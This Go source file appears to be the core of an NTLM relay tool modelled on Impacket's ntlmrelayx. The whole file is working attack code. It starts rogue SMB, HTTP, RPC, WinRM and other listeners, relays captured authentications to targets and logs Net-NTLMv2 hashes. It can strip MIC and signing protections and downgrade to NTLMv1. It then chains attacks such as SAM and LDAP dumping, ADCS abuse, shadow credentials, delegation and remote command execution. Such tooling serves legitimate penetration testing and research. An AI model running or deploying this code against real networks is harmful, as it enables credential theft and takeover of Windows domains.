// SPDX-License-Identifier: Apache-2.0

package relay

import (
	"fmt"
	"log"
	"strings"

	"gopacket/internal/build"
)

// socksServer is the global SOCKS server instance (set if -socks enabled).
var socksServer *SOCKSServer

// Run starts the relay orchestrator.
func Run(cfg *Config) error {
	// Initialize target processor for multi-target routing (must be before GetTarget)
	cfg.InitTargets()

	// Validate config
	target := cfg.GetTarget()
	if target == nil {
		return fmt.Errorf("target address is required")
	}
	if cfg.ListenAddr == "" {
		cfg.ListenAddr = ":445"
	}
	if cfg.Attack == "" && !cfg.Interactive && !cfg.SOCKSEnabled {
		// Auto-select attack based on target and flags (matches Impacket UX)
		if target.Scheme == "smb" {
			cfg.Attack = "samdump"
		} else if target.Scheme == "mssql" {
			cfg.Attack = "mssqlquery"
		} else if target.Scheme == "winrm" || target.Scheme == "winrms" {
			cfg.Attack = "winrmexec"
		} else if target.Scheme == "rpc" {
			if cfg.RPCMode == "ICPR" {
				cfg.Attack = "icpr"
			} else {
				cfg.Attack = "rpctschexec"
			}
		} else if target.Scheme == "http" || target.Scheme == "https" || cfg.ADCSAttack {
			cfg.Attack = "adcs"
		} else if cfg.DelegateAccess {
			cfg.Attack = "delegate"
		} else if cfg.AddComputer != "" {
			cfg.Attack = "addcomputer"
		} else if cfg.ShadowCredentials {
			cfg.Attack = "shadowcreds"
		} else if cfg.DumpLAPS {
			cfg.Attack = "laps"
		} else if cfg.DumpGMSA {
			cfg.Attack = "gmsa"
		} else if cfg.AddDNSRecord[0] != "" {
			cfg.Attack = "adddns"
		} else {
			cfg.Attack = "ldapdump"
		}
	}

	log.Printf("[*] NTLM Relay")
	if len(cfg.originalTargets) > 1 {
		log.Printf("[*] Targets: %d hosts", len(cfg.originalTargets))
		for _, t := range cfg.originalTargets {
			log.Printf("[*]   %s", t.URL())
		}
	} else {
		log.Printf("[*] Target: %s", target.URL())
	}
	if cfg.Interactive {
		log.Printf("[*] Mode: interactive")
	} else if cfg.SOCKSEnabled {
		log.Printf("[*] Mode: SOCKS")
	} else {
		log.Printf("[*] Attack: %s", cfg.Attack)
		if (cfg.Attack == "smbexec" || cfg.Attack == "tschexec" || cfg.Attack == "rpctschexec") && cfg.Command != "" {
			log.Printf("[*] Command: %s", cfg.Command)
		}
	}

	// Start SOCKS5 proxy if enabled
	if cfg.SOCKSEnabled {
		socksAddr := cfg.SOCKSAddr
		if socksAddr == "" {
			socksAddr = "127.0.0.1:1080"
		}
		socksServer = NewSOCKSServer(socksAddr)
		if err := socksServer.Start(); err != nil {
			log.Printf("[!] SOCKS5 server failed: %v", err)
		} else {
			defer socksServer.Stop()
		}

		// Start REST API for relay session data (matches Impacket's Flask API)
		apiPort := cfg.APIPort
		if apiPort == 0 {
			apiPort = 9090
		}
		apiAddr := fmt.Sprintf("127.0.0.1:%d", apiPort)
		apiServer := NewAPIServer(apiAddr, socksServer)
		if err := apiServer.Start(); err != nil {
			log.Printf("[!] REST API server failed: %v", err)
		} else {
			defer apiServer.Stop()
		}
	}

	authCh := make(chan AuthResult, 10)

	// Start SMB relay server
	if !cfg.NoSMBServer {
		smbAddr := cfg.ListenAddr
		if smbAddr == "" {
			smbAddr = fmt.Sprintf(":%d", cfg.SMBPort)
		}
		smbServer := NewSMBRelayServer(smbAddr)
		if err := smbServer.Start(authCh); err != nil {
			// Non-fatal: SMB port may require root
			log.Printf("[!] SMB server failed: %v", err)
		} else {
			defer smbServer.Stop()
		}
	}

	// Start HTTP relay server
	if !cfg.NoHTTPServer {
		httpAddr := fmt.Sprintf(":%d", cfg.HTTPPort)
		httpServer := NewHTTPRelayServer(httpAddr, cfg)
		if err := httpServer.Start(authCh); err != nil {
			log.Printf("[!] HTTP server failed: %v", err)
		} else {
			defer httpServer.Stop()
		}

		// Start HTTPS relay server
		httpsAddr := fmt.Sprintf(":%d", cfg.HTTPSPort)
		httpsServer, err := NewHTTPSRelayServer(httpsAddr, cfg)
		if err != nil {
			log.Printf("[!] HTTPS server init failed: %v", err)
		} else {
			if err := httpsServer.Start(authCh); err != nil {
				log.Printf("[!] HTTPS server failed: %v", err)
			} else {
				defer httpsServer.Stop()
			}
		}
	}

	// Start RAW relay server
	if !cfg.NoRawServer {
		rawPort := cfg.RawPort
		if rawPort == 0 {
			rawPort = 6666
		}
		rawAddr := fmt.Sprintf(":%d", rawPort)
		rawServer := NewRAWRelayServer(rawAddr)
		if err := rawServer.Start(authCh); err != nil {
			log.Printf("[!] RAW server failed: %v", err)
		} else {
			defer rawServer.Stop()
		}
	}

	// Start WCF relay server (ADWS, port 9389)
	if !cfg.NoWCFServer {
		wcfPort := cfg.WCFPort
		if wcfPort == 0 {
			wcfPort = 9389
		}
		wcfAddr := fmt.Sprintf(":%d", wcfPort)
		wcfServer := NewWCFRelayServer(wcfAddr)
		if err := wcfServer.Start(authCh); err != nil {
			log.Printf("[!] WCF server failed: %v", err)
		} else {
			defer wcfServer.Stop()
		}
	}

	// Start RPC relay server (port 135)
	if !cfg.NoRPCServer {
		rpcPort := cfg.RPCPort
		if rpcPort == 0 {
			rpcPort = 135
		}
		rpcAddr := fmt.Sprintf(":%d", rpcPort)
		rpcServer := NewRPCRelayServer(rpcAddr)
		if err := rpcServer.Start(authCh); err != nil {
			log.Printf("[!] RPC server failed: %v", err)
		} else {
			defer rpcServer.Stop()
		}
	}

	// Start WinRM relay servers (ports 5985/5986)
	if !cfg.NoWinRMServer {
		winrmPort := cfg.WinRMPort
		if winrmPort == 0 {
			winrmPort = 5985
		}
		winrmAddr := fmt.Sprintf(":%d", winrmPort)
		winrmServer := NewWinRMRelayServer(winrmAddr, cfg)
		if err := winrmServer.Start(authCh); err != nil {
			log.Printf("[!] WinRM server failed: %v", err)
		} else {
			defer winrmServer.Stop()
		}

		winrmsPort := cfg.WinRMSPort
		if winrmsPort == 0 {
			winrmsPort = 5986
		}
		winrmsAddr := fmt.Sprintf(":%d", winrmsPort)
		winrmsServer, err := NewWinRMSRelayServer(winrmsAddr, cfg)
		if err != nil {
			log.Printf("[!] WinRMS server init failed: %v", err)
		} else {
			if err := winrmsServer.Start(authCh); err != nil {
				log.Printf("[!] WinRMS server failed: %v", err)
			} else {
				defer winrmsServer.Stop()
			}
		}
	}

	// Process relay sessions
	if cfg.SOCKSEnabled && socksServer != nil {
		// With SOCKS: run auth loop in background, console on main goroutine
		go func() {
			for auth := range authCh {
				go handleAuth(auth, cfg)
			}
		}()
		runConsole(cfg, socksServer)
		return nil
	}

	// Without SOCKS: block on auth loop (original behavior)
	for auth := range authCh {
		go handleAuth(auth, cfg)
	}

	return nil
}

// handleAuth processes a captured authentication by relaying to the target.
func handleAuth(auth AuthResult, cfg *Config) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[-] Panic in handleAuth: %v", r)
		}
	}()

	// Use identity from previous auth if available, otherwise empty for initial selection
	target := cfg.GetTargetForIdentity("")
	if target == nil {
		log.Printf("[-] No target available")
		close(auth.Type2Ch)
		return
	}

	// Create protocol client based on target scheme
	var client ProtocolClient
	switch target.Scheme {
	case "smb":
		client = NewSMBRelayClient(target.Addr())
	case "ldap":
		client = NewLDAPRelayClient(target.Addr(), false)
	case "ldaps":
		client = NewLDAPRelayClient(target.Addr(), true)
	case "mssql":
		client = NewMSSQLRelayClient(target.Addr())
	case "http":
		c := NewHTTPRelayClient(target.Addr(), false)
		c.SetPath(target.Path)
		client = c
	case "https":
		c := NewHTTPRelayClient(target.Addr(), true)
		c.SetPath(target.Path)
		client = c
	case "winrm":
		client = NewWinRMRelayClient(target.Addr(), false)
	case "winrms":
		client = NewWinRMRelayClient(target.Addr(), true)
	case "rpc":
		rpcMode := cfg.RPCMode
		if rpcMode == "" {
			rpcMode = "TSCH"
		}
		client = NewRPCRelayClient(target.Addr(), rpcMode)
	default:
		log.Printf("[-] Unsupported target scheme: %s", target.Scheme)
		close(auth.Type2Ch)
		return
	}

	// Connect to target
	if err := client.InitConnection(); err != nil {
		log.Printf("[-] Failed to connect to target %s: %v", target.URL(), err)
		close(auth.Type2Ch)
		return
	}
	// In SOCKS mode the client stays alive for proxying; otherwise clean up
	if !cfg.SOCKSEnabled {
		defer client.Kill()
	}

	// Apply NTLM manipulation if configured
	type1 := auth.NTLMType1
	if cfg.RemoveMIC {
		type1 = removeSigningFlags(type1)
	}

	// Relay Type 1 → get Type 2
	type2, err := client.SendNegotiate(type1)
	if err != nil {
		log.Printf("[-] Failed to relay Type 1 to target: %v", err)
		close(auth.Type2Ch)
		return
	}

	// Keep original Type 2 for hash extraction (before NTLMv1 downgrade modifies it)
	origType2 := type2

	// Apply NTLMv1 downgrade to Type2 if configured
	if cfg.NTLMv1 {
		type2 = downgradeToNTLMv1(type2)
	}

	if build.Debug {
		log.Printf("[D] Relay: forwarding challenge to victim (%d bytes)", len(type2))
	}

	// Send Type 2 back to server (which forwards to victim)
	auth.Type2Ch <- type2

	// Wait for Type 3 from server
	type3, ok := <-auth.Type3Ch
	if !ok || type3 == nil {
		log.Printf("[-] No Type 3 received from victim %s", auth.SourceAddr)
		auth.ResultCh <- false
		return
	}

	// Extract and log Net-NTLMv2 hash (before any manipulation, and before relay attempt
	// so the hash is captured even if relay fails — matches Impacket behavior)
	domain, user := extractNTLMType3Info(type3)
	if hash := extractNetNTLMv2Hash(origType2, type3, domain, user); hash != "" {
		logCapturedHash(hash, cfg.OutputFile)
	}

	// Apply NTLM manipulation to Type 3
	if cfg.RemoveMIC {
		type3 = removeMIC(type3)
	}

	// Relay Type 3 to target
	identity := fmt.Sprintf("%s\\%s", domain, user)

	if err := client.SendAuth(type3); err != nil {
		log.Printf("[-] Authentication relay failed for %s from %s: %v",
			identity, auth.SourceAddr, err)
		// In SOCKS mode, don't register attacks — target stays available for other users
		// Matches Impacket: registerTarget() is NOT called when runSocks is enabled
		if !cfg.SOCKSEnabled {
			cfg.RegisterAttack(target, identity, false)
		}
		auth.ResultCh <- false
		return
	}

	log.Printf("[+] Relay successful: %s (from %s → %s)",
		identity, auth.SourceAddr, target.URL())
	// In SOCKS mode, don't register attacks — target stays available for other users
	// Matches Impacket: registerTarget() is NOT called when runSocks is enabled
	if !cfg.SOCKSEnabled {
		cfg.RegisterAttack(target, identity, true)
	}
	auth.ResultCh <- true

	// Store relayed identity for attack modules (e.g., ADCS needs username)
	cfg.relayedUser = user
	cfg.relayedDomain = domain

	// Set delegate target from the relayed user (for RBCD delegation attacks)
	// Impacket only triggers delegate if relayed user is a computer account (ends with $)
	if cfg.DelegateAccess && cfg.delegateTarget == "" {
		if strings.HasSuffix(user, "$") {
			cfg.delegateTarget = user
		} else {
			log.Printf("[*] Skipping delegate for %s\\%s — not a computer account", domain, user)
		}
	}

	// Auto-set shadow credentials target from the relayed computer account (matches Impacket)
	if (cfg.ShadowCredentials || cfg.Attack == "shadowcreds") && cfg.ShadowTarget == "" {
		if strings.HasSuffix(user, "$") {
			cfg.ShadowTarget = user
		}
	}

	// If SOCKS mode is enabled, register the relay for proxying and keep alive
	if cfg.SOCKSEnabled && socksServer != nil {
		sd := &SessionData{ChallengeMessage: type2}
		// For MSSQL, capture TDS-specific raw packets for SOCKS plugin replay
		if mssqlClient, ok := client.(*MSSQLRelayClient); ok {
			sd.MSSQLChallengeTDS = mssqlClient.GetRelayRawChallenge()
			sd.MSSQLAuthAnswer = mssqlClient.GetRelayRawAuthAnswer()
		}
		socksServer.AddRelay(target.Addr(), fmt.Sprintf("%s\\%s", domain, user), target.Scheme, client, sd)
		log.Printf("[*] SOCKS: Session registered. Use proxychains to connect to %s:%d", target.Host, target.Port)
		// In SOCKS mode, don't kill the client connection — it stays alive for tunneling.
		// Block here to keep the session open until the SOCKS server stops.
		<-cfg.stopCh()
		return
	}

	session := client.GetSession()
	if session == nil {
		log.Printf("[-] No session available for attack")
		return
	}

	// Interactive mode: start TCP shell instead of automated attack (matches Impacket -i)
	if cfg.Interactive {
		startInteractiveShell(session, target, identity)
		return
	}

	// For LDAP targets, chain attacks like Impacket: domain dump first, then the selected attack
	isLDAP := target.Scheme == "ldap" || target.Scheme == "ldaps"
	if isLDAP && !cfg.NoDump && cfg.Attack != "ldapdump" {
		dumpMod := getAttackModule("ldapdump")
		if dumpMod != nil {
			if build.Debug {
				log.Printf("[D] Relay: running domain dump before '%s'", cfg.Attack)
			}
			if err := dumpMod.Run(session, cfg); err != nil {
				log.Printf("[-] Domain dump failed: %v", err)
			}
		}
	}

	// Execute primary attack
	attackMod := getAttackModule(cfg.Attack)
	if attackMod == nil {
		log.Printf("[-] Unknown attack type: %s", cfg.Attack)
		return
	}

	if build.Debug {
		log.Printf("[D] Relay: executing attack '%s' with session type %T", attackMod.Name(), session)
	}

	if err := attackMod.Run(session, cfg); err != nil {
		log.Printf("[-] Attack '%s' failed: %v", attackMod.Name(), err)

		// Impacket behavior: on access denied for SMB attacks, fall back to enum-local-admins
		if cfg.EnumAdmins && target.Scheme == "smb" &&
			strings.Contains(err.Error(), "access") {
			log.Printf("[*] Relayed user is not admin, enumerating local admins...")
			enumMod := getAttackModule("enumlocaladmins")
			if enumMod != nil {
				if enumErr := enumMod.Run(session, cfg); enumErr != nil {
					log.Printf("[-] Enum local admins failed: %v", enumErr)
				}
			}
		}
	}
}
